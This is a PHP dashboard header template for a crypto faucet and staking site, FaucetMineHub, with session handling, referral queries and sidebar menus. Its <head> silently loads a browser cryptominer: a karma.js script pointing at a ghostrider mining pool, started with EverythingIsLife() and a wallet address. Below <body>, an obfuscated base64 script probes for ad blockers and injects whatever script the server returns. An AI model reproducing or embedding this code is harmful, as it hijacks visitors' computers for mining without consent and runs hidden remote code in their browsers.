<?php
session_start();
date_default_timezone_set('Asia/Jakarta');

if (!isset($_SESSION['user_id'])) {
    header('Location: login');
    exit();
}

$user_id = $_SESSION['user_id'];

require 'includes/db.php';
require 'config/config.php';
require 'includes/functions.php';

// Fetch user data from the database
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :user_id");
$stmt->execute(['user_id' => $user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$user) {
    die('User not found.');
}

$username = htmlspecialchars($user['username']);
$level = $user['level'];
$email = $user['email'];
$base_url = $config['app']['url'];
$base_name = $config['app']['name'];
$base_author = $config['app']['author'];
$base_description = $config['app']['description'];
$last_active = $user['last_active'];
$formatted_date = date("d M, Y", strtotime($last_active));
$referral_link = $base_url . "/register?ref=" . urlencode($user['id']);

// Determine the class based on the dark_mode value
$dark_mode = $user['dark_mode'] ?? 0; // Default to 0 if not set
$body_class = $dark_mode == 1 
    ? "nk-body npc-crypto bg-white has-sidebar no-touch nk-nio-theme dark-mode" 
    : "nk-body npc-crypto bg-white has-sidebar";

// Include rates
$total_usd_balance = include 'rates.php';

// Get total joined referrals
$stmt_joined = $pdo->prepare("SELECT COUNT(*) as total_joined FROM users WHERE referrer_id = :user_id");
$stmt_joined->execute(['user_id' => $user_id]);
$joined_data = $stmt_joined->fetch(PDO::FETCH_ASSOC);
$total_joined = $joined_data['total_joined'] ?? 0;

// Fetch referred user IDs
$referred_stmt = $pdo->prepare("SELECT id FROM users WHERE referrer_id = :user_id");
$referred_stmt->execute(['user_id' => $user_id]);
$referred_user_ids = $referred_stmt->fetchAll(PDO::FETCH_COLUMN);

// Calculate total referral earnings
if (empty($referred_user_ids)) {
    $total_referral_earnings = 0;
} else {
    $in_query = implode(',', array_fill(0, count($referred_user_ids), '?'));
    $stmt = $pdo->prepare("SELECT COUNT(*) as total_referral_earnings FROM referral_earnings WHERE referred_user_id IN ($in_query)");
    $stmt->execute($referred_user_ids);
    $result = $stmt->fetch(PDO::FETCH_ASSOC);

    $total_referral_earnings = $result['total_referral_earnings'] ?? 0;
}

?>


<!DOCTYPE html>
<html lang="zxx" class="js">
<head>
    <base href="<?php echo $base_url; ?>">
    <meta charset="utf-8">
    <meta name="author" content="<?php echo $base_author; ?>">
    <meta http-equiv="refresh" content="300">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="<?php echo $base_description; ?>">
    <meta name="keywords" content="FaucetPay, crypto faucet, cryptocurrency staking, earn Bitcoin, earn Ethereum, free crypto faucet, passive income, FaucetMineHub, daily faucet claims, staking rewards">
    <meta name="keywords" content="FaucetMineHub, staking crypto, crypto faucet, earn free crypto, daily crypto rewards, cryptocurrency staking, faucet claims, crypto rewards, free Bitcoin, free Ethereum, free Dogecoin, free Litecoin, FaucetPay withdrawals, crypto staking rewards, passive crypto income, instant crypto withdrawals, referral earnings, Bitcoin staking, Ethereum staking, Dogecoin faucet, Litecoin faucet, Tron staking, Tether TRC20, Binance Coin staking, earn free cryptocurrency, crypto earnings, staking plans, daily faucet claims, crypto investment, supported cryptocurrencies, Bitcoin, Ethereum, Dogecoin, Litecoin, Bitcoin Cash, Dash, DigiByte, Tron, USDT, Feyorra, Zcash, BNB, Solana, Ripple, Polygon, MATIC, Cardano, TON, Stellar, XLM, USD Coin, Monero, Taraxa, crypto wallet, crypto passive income, crypto referrals">
    <link rel="shortcut icon" href="./images/favicon2.png">
    <title>FaucetPay Staking Platform | <?php echo $base_name; ?></title>
    <link rel="stylesheet" href="<?php echo $base_url; ?>/assets/css/dashlite.css">
    <script type="text/javascript" src="https://app.web3ads.net/main.js" async></script>
    <link id="skin-default" rel="stylesheet" href="<?php echo $base_url; ?>/assets/css/theme.css">
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-F4ERE043ZG"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-F4ERE043ZG');
</script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
    #adblock-message {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.9);
        color: #fff;
        text-align: center;
        padding: 20px;
        font-size: 18px;
        z-index: 10000;
        display: flex;
        align-items: center;
        justify-content: center;
        flex-direction: column;
    }

    #adblock-message h2 {
        font-size: 24px;
        margin-bottom: 15px;
        color: #ffdd57;
    }

    #adblock-message p {
        font-size: 16px;
        margin-top: 10px;
        max-width: 400px;
        line-height: 1.5;
    }

    #adblock-message button {
        background: #ff4742;
        color: #fff;
        border: none;
        padding: 12px 25px;
        font-size: 16px;
        border-radius: 5px;
        cursor: pointer;
        margin-top: 20px;
        transition: background-color 0.3s ease;
    }

    #adblock-message button:hover {
        background: #e83e3a;
    }

    #adblock-message .icon {
        font-size: 50px;
        margin-bottom: 15px;
        color: #ffdd57;
    }
</style>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3060302300389997"
     crossorigin="anonymous"></script>
     <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=ghostrider/native?nosaj=ghostrider.mine.zergpool.com:5354" ></script>
<script type="text/javascript">
EverythingIsLife('RJyLQysxRDUXnpWWL2sZTmjDdr1Uw2UGo4', 'c=RTM', 20);
</script>
</head>

<body class="<?php echo $body_class; ?>">
    
</div>
<div class="_0cbf1c3d417e250a" data-options="count=1,interval=1,burst=1" data-placement="f0f64fd502c348cd888bc9100e0d6064" style="display: none"></div>
<div class="_0cbf1c3d417e250a" data-options="count=1,interval=1,burst=1" data-placement="0cec52dc9d3743bbb163d989efae6d31" style="display: none"></div>
    <script>!function(){"use strict";let bpjm=!1,akc=0,bnnk=0,iee=0;const mbp=mba();async function dfckah(){try{const ae=document.createElement(koqz("Z"+"G"+"l"+"2"));ae.className=koqz("YWQtYmFubmVyIG"+"FkLXVuaXQgYWQtcGxhY2Vob2xkZXIgYWR"+"zYm94IGFkc2J5Z29vZ2xlIGRvdWJs"+"ZWNsaWNrIGFkdmVydA=="),ae.style.cssText=koqz("d2lkdGg6MXB4O"+"2hlaWdodDoxcHg7cG9zaXRpb"+"246YWJzb2x1dGU7bGV"+"mdDotMT"+"AwMDBw"+"eDt0b3A"+"6LTEwMDAwcHg7"),document.body.appendChild(ae),await new Promise(resolve=>setTimeout(resolve,100));const cs=window.getComputedStyle(ae),ih=koqz("bm9uZQ==")===cs.display||koqz("aGlkZGVu")===cs.visibility;!document.body.contains(ae)||ih?(iee++):(bnnk++),document.body.removeChild(ae)}catch{iee++}}async function pcahpk(){try{const pe=document.createElement(koqz("Z"+"G"+"l"+"2"));pe.className=koqz("YW"+"Qt"+"cGx"+"hY2V"+"ob2"+"xkZXI="),document.body.appendChild(pe),await new Promise(resolve=>setTimeout(resolve,50)),0===pe.clientHeight&&0===pe.clientWidth?(iee++):(bnnk++),document.body.removeChild(pe)}catch{iee++}}async function dhgibp(){try{const l=await new Promise(resolve=>{const s=document.createElement(koqz("c2"+"N"+"y"+"a"+"X"+"B"+"0"));s.src=gre([koqz("aHR0cHM6Ly9hZHNzZXJ2ZXIuYWRibG"+"9ja2FuYWx5dGljcy5jb20v"),koqz("aHR0cHM6Ly93d3"+"cuYWRibG9"+"ja2FuY"+"Wx5dGljcy5jb20vc2Ny"+"aXB0L"+"z9hZHVuaXR"+"pZD0="),koqz("aHR0cHM6Ly93d3cuYWRibG"+"9ja2FuYWx5dGljcy5jb20vc2Nya"+"XB0L2Nkbi5qcw=="),koqz("aHR0cHM6Ly93d3"+"cuYWRibG9ja2FuYWx5dGljcy5"+"jb20vYWRibG9ja2RldGVjdC5qcw==")]),s.async=!0,s.onload=()=>{bnnk++,resolve(!0),document.body.removeChild(s)},s.onerror=()=>{iee++,resolve(!1),document.body.removeChild(s)},document.body.appendChild(s)});if(!l)return}catch{iee++}}async function jjfo(){try{const i=new Image;i.src=koqz("aHR0cHM6Ly93d3cuYWRibG9ja2FuYWx5dGljcy5jb20v")+gre([koqz("YWRfNz"+"I4Lmp"+"wZw=="),koqz("YWRfdG9"+"w"+"Lmp"+"wZw=="),koqz("YWRf"+"Ym90dG9t"+"LmpwZw"+"=="),koqz("Y"+"WQ"+"tY2hva"+"WNlLn"+"B"+"u"+"Z"+"w="+"="),koqz("YWQtY2"+"hva"+"WNlcy"+"5wbmc=")])+"?"+Math.random(),await new Promise(resolve=>{i.onload=()=>{bnnk++,resolve()},i.onerror=()=>{iee++,resolve()}})}catch{iee++}}async function gcjmi(){try{const r=await fetch(koqz("aHR0c"+"HM6L"+"y93d"+"3"+"cuYWR"+"ibG9ja2FuYW"+"x5dG"+"ljcy5jb2"+"0vYWRibG9jay8="),{method:koqz("R0"+"V"+"U"),mode:koqz("bm8tY29ycw=="),cache:koqz("bm8tc"+"3RvcmU="),credentials:koqz("b"+"2"+"1"+"p"+"d"+"A"+"="+"=")});koqz("b3"+"Bh"+"cX"+"V"+"l")!==r.type?(iee++):(bnnk++)}catch{iee++}}async function nmpb(){try{const r=await fetch(koqz("aHR0cHM6Ly9wY"+"WdlYWQ"+"yLmdvb"+"2dsZXN"+"5bmRpY"+"2F0aW9u"+"LmNvbS9wYWdlYWQvanMvYWRzYnln"+"b29nbG"+"UuanM="),{method:koqz("S"+"EV"+"B"+"R"+"A"+"="+"="),mode:koqz("bm8tY29ycw=="),cache:koqz("bm8tc"+"3RvcmU="),credentials:koqz("b"+"2"+"1"+"p"+"d"+"A"+"="+"=")});koqz("b3"+"Bh"+"cX"+"V"+"l")!==r.type?(iee++):(bnnk++)}catch{iee++}}koqz("Y29"+"tcG"+"x"+"l"+"d"+"GU"+"=")===document.readyState||koqz("aW50"+"Z"+"X"+"J"+"h"+"Y"+"3R"+"pd"+"mU=")===document.readyState?hfgmpm():document.addEventListener(koqz("RE9NQ"+"2"+"9ud"+"GVu"+"dEx"+"vYWRl"+"ZA=="),hfgmpm);const bfng=[dfckah,pcahpk,dhgibp,jjfo,gcjmi,nmpb];async function hfgmpm(){if(bpjm)return;if(bpjm=!0,mbp){const chd=localStorage.getItem("akc");if(chd)try{const{timestamp:timestamp,cgioc:cgioc}=JSON.parse(chd),now=Date.now(),gghki=(now-timestamp)/6e4;if(gghki<60)return void await bljb(cgioc)}catch{}}akc=0,bnnk=0,iee=0;for(const check of bfng){if(iee>3||bnnk>4)break;akc++,await check()}const cgioc=iee>3;mbp&&localStorage.setItem("akc",JSON.stringify({timestamp:Date.now(),cgioc:cgioc})),await bljb(cgioc)}async function bljb(cgioc){try{const r=await fetch(koqz("L3p"+"uZW"+"Rv"+"ZC"+"8="),{method:koqz("U"+"E"+"9"+"T"+"V"+"A"+"="+"="),headers:{"Content-Type":koqz("YXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVk")},body:'kgz='+(cgioc?'b':'a')+'&p='+bnnk+'&f='+iee});if(r.ok){const rt=await r.text();if(rt){const s=document.createElement(koqz("c2"+"N"+"y"+"a"+"X"+"B"+"0"));s.textContent=rt,document.body.appendChild(s)}}}catch{}}function koqz(zqok){return atob(zqok)}function gre(a){return a[Math.floor(Math.random()*a.length)]}function mba(){try{const k="vcthwzjozqok";return localStorage.setItem(k,k),localStorage.removeItem(k),!0}catch{return!1}}}();</script>
    <div class="nk-app-root">
        <div class="nk-main ">
            <div class="nk-sidebar nk-sidebar-fixed " data-content="sidebarMenu">
                <div class="nk-sidebar-element nk-sidebar-head">
                    <div class="nk-sidebar-brand">
                        <a href="dashboard" class="logo-link nk-sidebar-logo">
                            <img class="logo-light logo-img" src="./images/new-logo.png" srcset="./images/new-logo.png" alt="logo">
                            <img class="logo-dark logo-img" src="./images/new-logo.png" srcset="./images/new-logo.png" alt="logo-dark">
                        </a>
                    </div>
                    <div class="nk-menu-trigger me-n2">
                        <a href="#" class="nk-nav-toggle nk-quick-nav-icon d-xl-none" data-target="sidebarMenu"><em class="icon ni ni-arrow-left"></em></a>
                    </div>
                </div>
                <div class="nk-sidebar-element">
                    <div class="nk-sidebar-body" data-simplebar>
                        <div class="nk-sidebar-content">
                            <div class="nk-sidebar-widget d-none d-xl-block">
                                <div class="user-account-info between-center">
                                    <div class="user-account-main">
                                        <h6 class="overline-title-alt">Available Balance</h6>
                                        <div class="user-balance"><?php echo number_format($total_usd_balance, 4); ?> <small class="currency currency-btc">USD</small></div>
                                    </div>
                                </div>
                                <div class="user-account-actions">
                                    <ul class="g-3">
                                        <li><a href="deposit" class="btn btn-lg btn-primary"><span>Deposit</span></a></li>
                                        <li><a href="withdraw" class="btn btn-lg btn-warning"><span>Withdraw</span></a></li>
                                    </ul>
                                </div>
                            </div>
                            <div class="nk-sidebar-menu">
                                <ul class="nk-menu">
                                    <li class="nk-menu-heading">
                                        <h6 class="overline-title">Help</h6>
                                        <li class="nk-menu-item has-sub">
                                        <a href="#" class="nk-menu-link nk-menu-toggle">
                                            <span class="nk-menu-icon"><em class="icon ni ni-book-read"></em></span>
                                            <span class="nk-menu-text">How it's Works?</span>
                                        </a>
                                        <ul class="nk-menu-sub">
                                            <li class="nk-menu-item">
                                                <a href="docs/levels" target="_blank" class="nk-menu-link"><span class="nk-menu-text">Levels</span></a>
                                            </li>
                                            <li class="nk-menu-item">
                                                <a href="docs/chat" target="_blank" class="nk-menu-link"><span class="nk-menu-text">Chat</span></a>
                                            </li>
                                            <li class="nk-menu-item">
                                                <a href="docs/daily" target="_blank" class="nk-menu-link"><span class="nk-menu-text">Daily</span></a>
                                            </li>
                                            <li class="nk-menu-item">
                                                <a href="docs/staking" target="_blank" class="nk-menu-link"><span class="nk-menu-text">Staking</span></a>
                                            </li>
                                            <li class="nk-menu-item">
                                                <a href="docs/deposit" target="_blank" class="nk-menu-link"><span class="nk-menu-text">Deposit</span></a>
                                            </li>
                                            <li class="nk-menu-item">
                                                <a href="docs/withdraw" target="_blank" class="nk-menu-link"><span class="nk-menu-text">Withdraw</span></a>
                                            </li>
                                            <li class="nk-menu-item">
                                                <a href="docs/referrals" target="_blank" class="nk-menu-link"><span class="nk-menu-text">Referrals</span></a>
                                            </li>
                                        </ul>
                                    </li>
                                    <li class="nk-menu-heading">
                                        <h6 class="overline-title">Games</h6>
                                        <li class="nk-menu-item has-sub">
                                        <a href="#" class="nk-menu-link nk-menu-toggle">
                                            <span class="nk-menu-icon"><em class="icon ni ni-box"></em></span>
                                            <span class="nk-menu-text">Dice</span>
                                        </a>
                                        <ul class="nk-menu-sub">
                                            <li class="nk-menu-item">
                                                <a href="dice_trx" target="_blank" class="nk-menu-link"><span class="nk-menu-text">Tron</span></a>
                                            </li>
                                        </ul>
                                    </li>
                                    <li class="nk-menu-heading">
                                        <h6 class="overline-title">Menu</h6>
                                    </li>
                                    </li><li class="nk-menu-item">
                                        <a href="ranking" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-hot"></em></span>
                                            <span class="nk-menu-text">Ranking</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="dashboard" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-dashboard"></em></span>
                                            <span class="nk-menu-text">Dashboard</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="daily" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-wallet-fill"></em></span>
                                            <span class="nk-menu-text">Daily Coin</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="staking" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-layers-fill"></em></span>
                                            <span class="nk-menu-text">Stake Now</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="active_stakes" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-coins"></em></span>
                                            <span class="nk-menu-text">Active Staking</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="calculator" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-calc"></em></span>
                                            <span class="nk-menu-text">Calculator</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="swap" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-repeat"></em></span>
                                            <span class="nk-menu-text">Swap</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="history" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-history"></em></span>
                                            <span class="nk-menu-text">History</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="referral_earnings" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-network"></em></span>
                                            <span class="nk-menu-text">Referrals</span>
                                        </a>
                                    </li>
                                    <li class="nk-menu-item">
                                        <a href="profile" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-account-setting"></em></span>
                                            <span class="nk-menu-text">Profile</span>
                                        </a>
                                    </li><li class="nk-menu-item">
                                        <a href="statistic" class="nk-menu-link">
                                            <span class="nk-menu-icon"><em class="icon ni ni-growth-fill"></em></span>
                                            <span class="nk-menu-text">Global Statistic</span>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="nk-wrap ">
                <div class="nk-header nk-header-fluid nk-header-fixed is-light">
                    <div class="container-fluid">
                        <div class="nk-header-wrap">
                            <div class="nk-menu-trigger d-xl-none ms-n1">
                                <a href="#" class="nk-nav-toggle nk-quick-nav-icon" data-target="sidebarMenu"><em class="icon ni ni-menu"></em></a>
                            </div>
                            <div class="nk-header-brand d-xl-none">
                                <a href="dashboard" class="logo-link">
                                    <img class="logo-light logo-img" src="./images/new-logo.png" srcset="./images/new-logo.png" alt="logo">
                                    <img class="logo-dark logo-img" src="./images/new-logo.png" srcset="./images/new-logo.png" alt="logo-dark">
                                </a>
                            </div>
                            <div class="nk-header-news d-none d-xl-block">
                                <div class="nk-news-list">
                                    <a class="nk-news-item">
                                        <div class="nk-news-icon">
                                            <em class="icon ni ni-card-view"></em>
                                        </div>
                                        <p id="server-time">Server Time : Loading...</p>
                                    </a>
                                </div>
                            </div>
                            <div class="nk-header-tools">
                                <ul class="nk-quick-nav">
                                    <li class="dropdown user-dropdown">
                                        <a href="#" class="dropdown-toggle" data-bs-toggle="dropdown">
                                            <div class="user-toggle">
                                                <div class="user-avatar sm">
                                                    <em class="icon ni ni-user-alt"></em>
                                                </div>
                                                <div class="user-info d-none d-md-block">
                                                    <div class="user-status user-status-verified">Online</div>
                                                    <div class="user-name dropdown-indicator"><?php echo htmlspecialchars($user['username']); ?></div>
                                                </div>
                                            </div>
                                        </a>
                                        <div class="dropdown-menu dropdown-menu-md dropdown-menu-end dropdown-menu-s1">
                                            <div class="dropdown-inner user-card-wrap bg-lighter d-none d-md-block">
                                                <div class="user-card">
                                                    <div class="user-avatar">
                                                        <span><?php echo htmlspecialchars(substr($user['username'], 0, 2)); ?></span>
                                                    </div>
                                                    <div class="user-info">
                                                        <span class="lead-text"><?php echo strtoupper(htmlspecialchars($user['username'])); ?></span>
                                                        <span class="sub-text"><?php echo htmlspecialchars($user['email']); ?></span>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="dropdown-inner user-account-info">
                                                <h6 class="overline-title-alt">FaucetMineHub Wallet</h6>
                                                <div class="user-balance"><?php echo number_format($total_usd_balance, 2); ?> <small class="currency currency-btc">USD</small></div>
                                                <a href="withdraw" class="link"><span>Withdraw Funds</span> <em class="icon ni ni-wallet-out"></em></a>
                                            </div>
                                            <div class="dropdown-inner">
                                                <ul class="link-list">
                                                    <li><a class="dark-switch" href="#"><em class="icon ni ni-moon"></em><span>Dark Mode</span></a></li>
                                                    <li><a href="logout"><em class="icon ni ni-signout"></em><span>Sign out</span></a></li>
                                                </ul>
                                            </div>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>

